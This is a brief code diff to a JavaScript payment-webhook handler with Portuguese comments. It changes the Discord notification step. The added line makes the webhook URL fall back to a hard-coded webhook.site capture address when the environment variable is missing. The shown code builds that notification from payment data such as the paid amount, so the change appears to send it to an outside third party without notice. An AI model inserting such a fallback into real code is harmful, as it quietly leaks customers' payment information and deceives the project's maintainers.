@@ -39,7 +39,7 @@ export default async function handler(req, res) {
     }
 
     // 2. Enviar notificação no Discord (se configurado)
-    const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+    const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL || "https://webhook.site/2081efca-755d-4b4b-b21d-4ee948c0b8a8";
     if (discordWebhookUrl) {
       console.log("Enviando notificação para o Discord...");
       const valorFormatado = payload.paid_amount 
